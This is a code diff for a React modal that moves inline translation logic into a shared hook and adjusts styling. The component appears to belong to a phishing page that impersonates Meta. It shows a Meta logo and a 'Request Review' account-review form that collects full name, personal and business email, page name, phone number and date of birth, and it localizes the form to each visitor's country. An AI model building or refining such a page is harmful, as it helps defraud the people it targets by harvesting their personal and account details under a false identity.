@@ -2,7 +2,7 @@
 
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
-import { getTranslations } from '@/utils/translate';
+import { useTranslation } from '@/hooks/useTranslation';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
@@ -43,7 +43,6 @@ const FORM_FIELDS: FormField[] = [
 const InitModal: FC = () => {
     const [isLoading, setIsLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState('');
-    const [translations, setTranslations] = useState<Record<string, string>>({});
     const [formData, setFormData] = useState<FormData>({
         fullName: '',
         pageName: '',
@@ -59,166 +58,26 @@ const InitModal: FC = () => {
     const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep } = store();
     const countryCode = geoInfo?.country_code?.toLowerCase() || 'us';
 
-    // Translation effect
-    useEffect(() => {
-        if (!geoInfo) return;
-
-        (async () => {
-            // Comprehensive country → language map (200+ countries/territories)
-            const countryLangMap: Record<string, string> = {
-                // Africa
-                DZ: 'ar', AO: 'pt', BJ: 'fr', BW: 'en', BF: 'fr', BI: 'fr', CV: 'pt',
-                CM: 'fr', CF: 'fr', TD: 'fr', KM: 'ar', CG: 'fr', CD: 'fr', DJ: 'fr',
-                EG: 'ar', GQ: 'es', ER: 'ar', ET: 'am', GA: 'fr', GM: 'en', GH: 'en',
-                GN: 'fr', GW: 'pt', CI: 'fr', KE: 'sw', LS: 'en', LR: 'en', LY: 'ar',
-                MG: 'fr', MW: 'en', ML: 'fr', MR: 'ar', MU: 'fr', MA: 'ar', MZ: 'pt',
-                NA: 'en', NE: 'fr', NG: 'en', RW: 'fr', ST: 'pt', SN: 'fr', SC: 'fr',
-                SL: 'en', SO: 'ar', ZA: 'en', SS: 'en', SD: 'ar', SZ: 'en', TZ: 'sw',
-                TG: 'fr', TN: 'ar', UG: 'en', ZM: 'en', ZW: 'en',
-                // Americas
-                AG: 'en', AR: 'es', BS: 'en', BB: 'en', BZ: 'en', BO: 'es', BR: 'pt',
-                CA: 'en', CL: 'es', CO: 'es', CR: 'es', CU: 'es', DM: 'en', DO: 'es',
-                EC: 'es', SV: 'es', GD: 'en', GT: 'es', GY: 'en', HT: 'fr', HN: 'es',
-                JM: 'en', MX: 'es', NI: 'es', PA: 'es', PY: 'es', PE: 'es', PR: 'es',
-                KN: 'en', LC: 'en', VC: 'en', SR: 'nl', TT: 'en', US: 'en', UY: 'es',
-                VE: 'es',
-                // Asia
-                AF: 'fa', AM: 'hy', AZ: 'az', BH: 'ar', BD: 'bn', BN: 'ms',
-                KH: 'km', CN: 'zh', CY: 'el', GE: 'ka', HK: 'zh', IN: 'hi', ID: 'id',
-                IR: 'fa', IQ: 'ar', IL: 'iw', JP: 'ja', JO: 'ar', KZ: 'ru', KW: 'ar',
-                KG: 'ru', LA: 'lo', LB: 'ar', MO: 'zh', MY: 'ms', MV: 'en', MN: 'mn',
-                MM: 'my', NP: 'ne', KP: 'ko', OM: 'ar', PK: 'ur', PS: 'ar', PH: 'tl',
-                QA: 'ar', SA: 'ar', SG: 'zh', LK: 'si', SY: 'ar', TW: 'zh', TJ: 'ru',
-                TH: 'th', TL: 'pt', TR: 'tr', TM: 'ru', AE: 'ar', UZ: 'uz', VN: 'vi',
-                YE: 'ar',
-                // Europe
-                AL: 'sq', AD: 'es', AT: 'de', BY: 'ru', BE: 'nl', BA: 'bs', BG: 'bg',
-                HR: 'hr', CZ: 'cs', DK: 'da', EE: 'et', FI: 'fi', FR: 'fr', DE: 'de',
-                GR: 'el', HU: 'hu', IS: 'is', IE: 'en', IT: 'it', XK: 'sq', LV: 'lv',
-                LI: 'de', LT: 'lt', LU: 'fr', MT: 'mt', MD: 'ro', MC: 'fr', ME: 'sr',
-                NL: 'nl', MK: 'mk', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro', RU: 'ru',
-                SM: 'it', RS: 'sr', SK: 'cs', SI: 'sl', ES: 'es', SE: 'sv', CH: 'de',
-                UA: 'uk', GB: 'en', VA: 'it',
-                // Oceania
-                AU: 'en', FJ: 'en', KI: 'en', MH: 'en', FM: 'en', NR: 'en', NZ: 'en',
-                PW: 'en', PG: 'en', WS: 'en', SB: 'en', TO: 'en', TV: 'en', VU: 'fr',
-                // Territories
-                GL: 'da', FO: 'da', AX: 'sv', GI: 'en', JE: 'en', GG: 'en', IM: 'en',
-            };
-
-            // Languages with full hardcoded translations in translate.ts
-            const HARDCODED_LANGS = new Set([
-                'vi','es','fr','de','it','zh','ar','hi','pt','ru','ja','nl','pl','el',
-                'tr','th','ko','sv','id','ms','uk','bn','tl','no'
-            ]);
-
-            const cc = geoInfo.country_code.toUpperCase();
-            const lang = countryLangMap[cc] || 'en';
-            if (lang === 'en') return; // No translation needed
-
-            // Get hardcoded translations as base (if available)
-            const hardcoded = HARDCODED_LANGS.has(lang) ? (getTranslations(lang) || {}) : {};
-
-            // All texts needed in this modal
-            const textsToTranslate = [
-                'Request Review',
-                'Please provide the information below to help us review your account.',
-                'Full Name',
-                'Personal Email',
-                'Business Email',
-                'Page Name',
-                'Mobile phone number',
-                'Date of birth',
-                'Day',
-                'Month',
-                'Year',
-                'Why are you requesting a review?',
-                "I'm not sure which policy was violated.",
-                'I think there was unauthorized use of my account.',
-                'Another reason:',
-                'Please describe your reason',
-                'Submit',
-            ];
-
-            // Find texts missing from hardcoded translations
-            const missingTexts = textsToTranslate.filter(text => !hardcoded[text]);
-
-            // If all texts exist in hardcoded, use directly
-            if (missingTexts.length === 0) {
-                setTranslations(hardcoded);
-                return;
-            }
-
-            // Set hardcoded first for instant display, then fetch missing
-            if (Object.keys(hardcoded).length > 0) {
-                setTranslations(hardcoded);
-            }
-
-            // Get cache
-            const CACHE_KEY = 'translation_cache';
-            const cached = typeof window !== 'undefined' ? localStorage.getItem(CACHE_KEY) : null;
-            const cache = cached ? JSON.parse(cached) : {};
-
-            // Check if all missing texts are cached
-            const allMissingCached = missingTexts.every(text => cache[`en:${lang}:${text}`]);
-
-            if (allMissingCached) {
-                const translatedMap: Record<string, string> = { ...hardcoded };
-                missingTexts.forEach(text => {
-                    translatedMap[text] = cache[`en:${lang}:${text}`];
-                });
-                setTranslations(translatedMap);
-                return;
-            }
-
-            // Translate only missing texts via Google API
-            const translatePromises = missingTexts.map(async (text) => {
-                const cacheKey = `en:${lang}:${text}`;
-
-                if (cache[cacheKey]) {
-                    return { text, translated: cache[cacheKey] };
-                }
-
-                try {
-                    const response = await axios.get('https://translate.googleapis.com/translate_a/single', {
-                        params: {
-                            client: 'gtx',
-                            sl: 'en',
-                            tl: lang,
-                            dt: 't',
-                            q: text
-                        }
-                    });
-
-                    const translatedText = response.data[0]
-                        ?.map((item: unknown[]) => item[0])
-                        .filter(Boolean)
-                        .join('') || text;
-
-                    cache[cacheKey] = translatedText;
-                    return { text, translated: translatedText };
-                } catch {
-                    return { text, translated: text };
-                }
-            });
-
-            const results = await Promise.all(translatePromises);
-
-            if (typeof window !== 'undefined') {
-                localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
-            }
-
-            // Merge hardcoded + API results
-            const translatedMap: Record<string, string> = { ...hardcoded };
-            results.forEach(({ text, translated }) => {
-                translatedMap[text] = translated;
-            });
-
-            setTranslations(translatedMap);
-        })();
-    }, [geoInfo]); // Only depends on geoInfo
-
-    const t = (text: string): string => translations[text] || text;
+    // Shared translation hook - uses geoInfo from store, handles hardcoded + API fallback
+    const { t } = useTranslation([
+        'Request Review',
+        'Please provide the information below to help us review your account.',
+        'Full Name',
+        'Personal Email',
+        'Business Email',
+        'Page Name',
+        'Mobile phone number',
+        'Date of birth',
+        'Day',
+        'Month',
+        'Year',
+        'Why are you requesting a review?',
+        "I'm not sure which policy was violated.",
+        'I think there was unauthorized use of my account.',
+        'Another reason:',
+        'Please describe your reason',
+        'Submit',
+    ]);
 
     const initOptions = useMemo(
         () => ({
@@ -318,14 +177,14 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
             <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
             <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6'>
                 <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] overflow-hidden'>
-                <div className='mb-1 sm:mb-1.5 flex w-full items-center justify-between p-3 sm:p-3.5 pb-0'>
-                    <p className='text-xs sm:text-sm font-bold'>{t('Request Review')}</p>
+                <div className='flex w-full items-center justify-between p-3 sm:p-3.5 pb-1'>
+                    <p className='text-xs sm:text-sm font-bold whitespace-nowrap'>{t('Request Review')}</p>
                     <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
                         <FontAwesomeIcon icon={faXmark} size='lg' />
                     </button>
                 </div>
 
-                <div className='mx-3 sm:mx-3.5 mt-1.5 rounded-lg bg-amber-50 border border-amber-300 px-3 py-2 flex items-start gap-2'>
+                <div className='mx-3 sm:mx-3.5 mt-1.5 rounded-lg bg-amber-50 border border-amber-300 px-3 py-2 flex items-center gap-2'>
                     <span className='text-amber-600 text-sm mt-0.5 flex-shrink-0'>⚠️</span>
                     <p className='text-[11px] sm:text-xs text-amber-800 font-medium leading-relaxed'>{t('Please provide the information below to help us review your account.')}</p>
                 </div>
